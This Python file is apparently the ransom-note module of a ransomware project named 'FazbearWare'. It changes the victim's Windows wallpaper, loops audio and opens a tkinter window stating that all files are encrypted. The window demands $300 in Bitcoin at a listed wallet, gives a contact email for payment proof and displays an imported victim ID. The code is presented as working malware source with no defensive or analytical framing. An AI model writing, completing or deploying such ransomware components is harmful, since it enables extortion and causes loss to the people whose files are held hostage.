"""
UI - FazbearWare
Description: Create and manage the window that advise about the ransom , also play music, and change background
"""
from victim_ID import VICTIM_ID
import tkinter as tk
import ctypes
import pygame
import os


"""
CHANGE WALLPAPER AND PLAY MUSIC

"""

def change_wallpaper_play_music():
    #change wallpaper
    relative_path = "assets/img.jpg"
    absolute_path = os.path.abspath(relative_path)

    relative_path2 = "assets/aud.mp3"
    absolute_path2 = os.path.abspath(relative_path2)
    
    if not os.path.exists(absolute_path):
        pass
    try:
        result = ctypes.windll.user32.SystemParametersInfoW(20, 0, absolute_path, 3)
        
    except Exception as e:
        pass
 
    #play music 
    pygame.mixer.init()
    pygame.mixer.music.load(absolute_path2)
    pygame.mixer.music.set_volume(0.5)  # volume (0.0 - 1.0)
    pygame.mixer.music.play(-1)  # -1 = infinite loop


change_wallpaper_play_music()

"""
RANSOM WINDOW 
"""

import tkinter as tk

window = tk.Tk()
window.title("FOUR FILES ARE ENCRYPTED BY FAZBEARWARE")
window.geometry("800x800")
window.resizable(False, False)
window.configure(bg="black")


main_title = tk.Label(
    window,
    text="Oops! All your files are encrypted",  
    fg="red",
    bg="black",
    font=("Georgia", 15,"underline"), 
    padx=20, pady=20
)
main_title.pack(side="top", pady=(25, 0)) 


description_label = tk.Label(
    window,
    text="Your important files are encrypted. Many of your documents, photos, videos, and other files are no longer accessible because they have been encrypted. If you are busy looking for a way to recover your files, do not waste your time. The only way to restore your files is to purchase a unique decryptor key.",
    fg="red",
    bg="black",
    font=("Georgia", 14),
    justify="left",
    wraplength=720
)
description_label.pack(side="top", pady=15)


payment_title = tk.Label(
    window,
    text="How to recover your files?:",  
    fg="red",
    bg="black",
    font=("Georgia", 16, "underline"),
    padx=20, pady=10
)
payment_title.pack(side="top", pady=(10, 0)) 

steps_label = tk.Label(
    window,
    text="1. Payment is accepted in Bitcoin (BTC) only. You must send the equivalent of $300 USD to the wallet address provided below.\n\n"
         "2. Send your Personal ID and a screenshot of the transaction to the following email: fazbear_recovery@darkmail.xyz\n\n"
         "3. Once the payment is confirmed, you will receive your unique decryptor key.",
    fg="red",
    bg="black",
    font=("Georgia", 13),
    justify="left", 
    wraplength=720
)
steps_label.pack(side="top", pady=10)


wallet_label = tk.Label(
    window,
    text="Bitcoin wallet address:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    fg="red", 
    bg="#000000", 
    font=("Georgia", 14),
    pady=15,
    width=60,
    relief="sunken", 
    borderwidth=1
)
wallet_label.pack(side="top", pady=15)

victim_id_label = tk.Label(
    window,
    text=f"Your personal id : {VICTIM_ID}",
    fg="red", 
    bg="#000000", 
    font=("Georgia", 14),
    pady=15,
    width=60,
    relief="sunken", 
    borderwidth=1
)
victim_id_label.pack(side="top", pady=10)

window.mainloop()
